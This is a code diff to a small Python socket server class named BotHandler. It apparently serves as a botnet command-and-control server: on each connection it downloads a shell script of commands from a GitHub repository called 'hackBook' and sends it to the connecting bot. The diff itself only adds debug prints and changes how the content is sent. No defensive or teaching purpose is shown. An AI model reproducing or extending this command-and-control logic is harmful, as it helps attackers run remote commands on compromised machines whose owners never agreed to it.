@@ -9,9 +9,10 @@ class BotHandler(socketserver.BaseRequestHandler):
     def handle(self):
         url = 'https://raw.githubusercontent.com/mishateml/hackBook/master/commands.sh'
         req = requests.get(url)
+        print("st1")
         if req.status_code == requests.codes.ok:
             con = req.content.decode()
-
+            print(con)
         else:
             print('Content was not found.')
 
@@ -19,7 +20,7 @@ class BotHandler(socketserver.BaseRequestHandler):
 
         print("Bot with IP {} sent:".format(self.client_address[0]))
         print(self.data)
-        self.request.sendall(con.encode())
+        self.request.sendall(con)
 
 
 HOST, PORT = "", 8000
